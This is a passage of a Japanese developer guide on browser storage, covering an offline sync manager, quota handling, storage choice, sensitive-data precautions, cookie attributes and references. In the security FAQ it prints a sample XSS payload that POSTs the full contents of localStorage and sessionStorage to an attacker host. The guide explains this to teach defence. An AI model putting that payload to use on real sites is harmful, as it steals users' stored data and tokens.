    const response = await fetch(
      `${this.apiBaseUrl}/${item.collection}/${item.data.id}`,
      {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(item.data),
      }
    );

    if (!response.ok) {
      const error = new Error(`Sync failed: ${response.status}`);
      error.status = response.status;
      throw error;
    }

    return response.json();
  }

  async resolveConflict(item) {
    // 楽観的ロック: サーバーのデータを取得して比較
    const response = await fetch(
      `${this.apiBaseUrl}/${item.collection}/${item.data.id}`
    );
    const serverData = await response.json();

    const db = await this.dbPromise;
    // サーバー側のデータで上書き（Last-Write-Wins）
    serverData.syncStatus = 'synced';
    await db.put('data', serverData);

    this.notifyListeners('conflict', {
      local: item.data,
      server: serverData,
    });
  }

  setupConnectivityListener() {
    window.addEventListener('online', () => {
      console.log('Back online. Starting sync...');
      this.syncAll();
    });
  }

  onSync(listener) {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }

  notifyListeners(event, data) {
    for (const listener of this.listeners) {
      listener(event, data);
    }
  }
}

// 使用例
const sync = new SyncManager('https://api.example.com');

sync.onSync((event, data) => {
  switch (event) {
    case 'syncStart':
      showSpinner('同期中...');
      break;
    case 'syncComplete':
      hideSpinner();
      showToast('同期完了');
      break;
    case 'conflict':
      showToast(`コンフリクトが発生しました: ${data.local.id}`);
      break;
    case 'syncError':
      showToast('同期エラーが発生しました', 'error');
      break;
  }
});

// オフラインでも即座にローカルに保存される
await sync.write('tasks', {
  title: 'オフラインで作成したタスク',
  status: 'pending',
});
```

---

## 12. FAQ（よくある質問）

### Q1: localStorage vs sessionStorage vs IndexedDB の使い分けは？

3つのストレージの使い分けは、データの**永続性**、**容量**、**構造の複雑さ**によって決定される。

**localStorage**:
- **用途**: ユーザー設定、テーマ、言語選択、UIの状態（サイドバーの開閉など）
- **特徴**: ブラウザを閉じても永続する、同一オリジンの全タブで共有される
- **容量**: 約5MB（文字列のみ）
- **適した場面**: 軽量な設定データで、ブラウザを再起動しても保持したい情報

**sessionStorage**:
- **用途**: フォームの一時保存、ウィザードの進行状態、タブ固有のセッション情報
- **特徴**: タブを閉じると自動的に削除される、他のタブとは共有されない
- **容量**: 約5MB（文字列のみ）
- **適した場面**: 一時的なデータで、タブ間で独立させたい情報（複数のフォーム入力を別タブで行う場合など）

**IndexedDB**:
- **用途**: オフラインアプリのデータベース、大量の構造化データ、バイナリデータ（画像、ファイル）
- **特徴**: 非同期API、トランザクション対応、インデックス検索、GB級の容量
- **適した場面**: 数百〜数千件以上のレコードを扱う、複雑な検索が必要、オフライン対応が必須

**選択フローチャート**:
```
データは1MB以上か？
 └─ YES → IndexedDB
 └─ NO → タブを閉じたら消えてよい？
          └─ YES → sessionStorage
          └─ NO → localStorage
```

実務での組み合わせ例:
- **ECサイト**: カート情報（localStorage）、フォーム入力途中（sessionStorage）、注文履歴（IndexedDB）
- **チャットアプリ**: ユーザー設定（localStorage）、現在の会話（sessionStorage）、全メッセージ履歴（IndexedDB）

### Q2: ストレージの容量制限を超えた場合の挙動と対処法は？

ストレージが容量制限を超えると、`QuotaExceededError`（DOMException）が発生する。この例外を適切にハンドリングしないと、アプリケーションがクラッシュする原因となる。

**エラーハンドリングの実装**:
```javascript
// localStorage の場合
try {
  localStorage.setItem('key', largeData);
} catch (error) {
  if (error.name === 'QuotaExceededError') {
    console.error('容量不足: ストレージがいっぱいです');
    // 対処: 古いデータを削除
    cleanupOldData();
    // 再試行
    try {
      localStorage.setItem('key', largeData);
    } catch (retryError) {
      // それでも失敗したらユーザーに通知
      showNotification('ストレージ容量が不足しています。不要なデータを削除してください。');
    }
  }
}

// IndexedDB の場合（トランザクションエラーとして発生）
const transaction = db.transaction(['store'], 'readwrite');
const store = transaction.objectStore('store');
const request = store.add(data);

request.onerror = (event) => {
  if (event.target.error.name === 'QuotaExceededError') {
    console.error('IndexedDB の容量不足');
    // LRU キャッシュの実装などで古いデータを削除
  }
};
```

**容量監視（Storage API）**:
```javascript
// 現在の使用量と利用可能な容量を取得
if ('storage' in navigator && 'estimate' in navigator.storage) {
  const estimate = await navigator.storage.estimate();
  const usageInMB = (estimate.usage / 1024 / 1024).toFixed(2);
  const quotaInMB = (estimate.quota / 1024 / 1024).toFixed(2);
  const percentUsed = ((estimate.usage / estimate.quota) * 100).toFixed(1);

  console.log(`使用量: ${usageInMB}MB / ${quotaInMB}MB (${percentUsed}%)`);

  // 80%を超えたら警告
  if (estimate.usage / estimate.quota > 0.8) {
    showWarning('ストレージ使用量が80%を超えています。古いデータの削除を検討してください。');
  }
}
```

**対処戦略**:
1. **LRU（Least Recently Used）キャッシュ**: アクセス日時をメタデータとして保存し、古いデータから削除
2. **優先度付き削除**: 重要度の低いデータ（キャッシュ、一時ファイル）から削除
3. **圧縮**: pako.js や lz-string で JSON データを圧縮して保存
4. **永続化リクエスト**: `navigator.storage.persist()` で重要なデータの保護を要求
5. **ユーザーへの通知**: 容量不足をUIで明示し、手動削除の選択肢を提供

### Q3: 機密データを localStorage/sessionStorage に保存する際の注意点は？

localStorage と sessionStorage は**暗号化されず平文で保存される**ため、機密データの保存には細心の注意が必要である。

**絶対に保存してはいけないもの**:
- パスワード（ハッシュ化されたものでも避けるべき）
- クレジットカード情報（PCI DSS違反）
- 個人識別可能な情報（PII）: マイナンバー、社会保障番号、運転免許証番号
- API秘密鍵、プライベートトークン

**保存を避けるべきもの**:
- 認証トークン（JWT）: HttpOnly Cookie を使うべき
- セッションID: Cookie（HttpOnly + Secure + SameSite）を使うべき

**XSSによる全データ漏洩リスク**:
Web Storage はJavaScriptから読み取り可能なため、XSS攻撃を受けると即座に全データが漏洩する。
```javascript
// XSS攻撃例（攻撃者が注入するコード）
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage}
  })
});
```

**どうしても機密データを保存する必要がある場合の対策**:

1. **Web Crypto API で暗号化**:
```javascript
// 暗号化キーの生成（ユーザーのパスフレーズから導出）
async function deriveKey(passphrase) {
  const enc = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    enc.encode(passphrase),
    'PBKDF2',
    false,
    ['deriveKey']
  );
  return crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt: enc.encode('salt'), iterations: 100000, hash: 'SHA-256' },
    keyMaterial,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );
}

// 暗号化して保存
async function encryptAndStore(key, data, cryptoKey) {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    cryptoKey,
    new TextEncoder().encode(JSON.stringify(data))
  );
  localStorage.setItem(key, JSON.stringify({
    iv: Array.from(iv),
    data: Array.from(new Uint8Array(encrypted))
  }));
}
```

2. **有効期限の設定**:
```javascript
// タイムスタンプ付きで保存
function setWithExpiry(key, value, ttl) {
  const item = {
    value,
    expiry: Date.now() + ttl
  };
  localStorage.setItem(key, JSON.stringify(item));
}

// 取得時に期限をチェック
function getWithExpiry(key) {
  const itemStr = localStorage.getItem(key);
  if (!itemStr) return null;

  const item = JSON.parse(itemStr);
  if (Date.now() > item.expiry) {
    localStorage.removeItem(key);
    return null;
  }
  return item.value;
}
```

3. **Content Security Policy (CSP) の設定**:
XSS攻撃を防ぐため、HTTPヘッダーでCSPを設定する。
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnD0m'
```

**推奨される代替手段**:
- 認証トークン → HttpOnly Cookie（JavaScriptからアクセス不可）
- 一時的な機密データ → メモリ内変数（ページリロードで消える）
- 永続的な機密データ → サーバー側セッション + セッションID（Cookie）

---

## FAQ

### Q1: localStorageに保存したデータはどのような場合に消えますか?
localStorageのデータはユーザーが明示的にブラウザのサイトデータを削除した場合、またはブラウザのストレージ圧迫時に自動退去（eviction）された場合に消えます。Safari の ITP（Intelligent Tracking Prevention）では、ユーザーが7日間サイトを訪問しない場合にlocalStorageが消去される制約があります。また、プライベートブラウジング（シークレットモード）ではセッション終了時に全て削除されます。永続化が必要な場合は `navigator.storage.persist()` を呼び出してストレージの永続化をリクエストすることを推奨します。

### Q2: IndexedDBとlocalStorageのどちらを選ぶべきですか?
保存するデータの量と構造で判断します。設定値やテーマ選択など、少量（数KB）の単純なキーバリューデータにはlocalStorageが適しています。一方、検索が必要な構造化データ、バイナリデータ（画像、ファイル）、数十MB以上のデータにはIndexedDBを使用します。IndexedDBは非同期APIのためメインスレッドをブロックせず、インデックスによる高速検索やトランザクションによるデータ整合性保証も提供します。PWAのオフラインデータ同期にはIndexedDBが事実上の標準です。

### Q3: Cookieのセキュリティで最低限設定すべき属性は何ですか?
認証用Cookieには最低限 `Secure`（HTTPS通信のみ送信）、`HttpOnly`（JavaScriptからアクセス不可、XSS対策）、`SameSite=Lax`（クロスサイトリクエストでのCSRF対策）の3属性を設定してください。加えて、`Path=/`（パス全体に適用）、適切な `Max-Age` または `Expires`（有効期限の明示）、プレフィックス `__Host-`（Secure + パスが / + ドメイン指定なしを強制）を付けることで、さらにセキュリティが強化されます。

---

## まとめ

### 各ストレージの要点

| ストレージ | 容量 | 主な用途 | 最大の利点 | 最大のリスク |
|-----------|------|---------|-----------|-------------|
| Cookie | 4KB | 認証（HttpOnly） | サーバー自動送信 | CSRF |
| localStorage | 5-10MB | ユーザー設定、テーマ | シンプル・永続 | XSS で全データ露出 |
| sessionStorage | 5-10MB | フォーム一時保存 | タブ閉じで自動消去 | XSS で全データ露出 |
| IndexedDB | GB級 | 大量データ、オフラインDB | 構造化・非同期・大容量 | API の複雑さ |
| Cache API | GB級 | HTTP レスポンスキャッシュ | SW連携・オフライン対応 | キャッシュ無効化の設計 |

### 設計時のチェックリスト

- [ ] 機密データ（トークン、パスワード）を localStorage/sessionStorage に保存していないか
- [ ] Cookie に HttpOnly / Secure / SameSite 属性を設定しているか
- [ ] QuotaExceededError のハンドリングを実装しているか
- [ ] プライベートブラウジングモードでの動作を検証したか
- [ ] ストレージが利用できない環境でのフォールバックを用意しているか
- [ ] IndexedDB のバージョン管理（マイグレーション）を適切に設計しているか
- [ ] 不要になったデータの削除（退去戦略）を実装しているか
- [ ] 複数タブ間のデータ整合性を考慮しているか

---

## 次に読むべきガイド

- [Service Worker とキャッシュ戦略の詳細](./01-service-worker-cache.md)

---

## 参考文献

1. WHATWG. "HTML Living Standard - Web Storage." https://html.spec.whatwg.org/multipage/webstorage.html
2. W3C. "Indexed Database API 3.0." https://www.w3.org/TR/IndexedDB-3/
3. MDN Web Docs. "Web Storage API." Mozilla, 2024. https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
4. MDN Web Docs. "IndexedDB API." Mozilla, 2024. https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API
5. MDN Web Docs. "Using HTTP cookies." Mozilla, 2024. https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
6. Barker, D. "RFC 6265bis: Cookies: HTTP State Management Mechanism." IETF, 2023. https://httpwg.org/http-extensions/draft-ietf-httpbis-rfc6265bis.html
7. Google Developers. "Storage for the Web." https://web.dev/articles/storage-for-the-web
8. Apple Developer. "Intelligent Tracking Prevention." https://webkit.org/tracking-prevention/
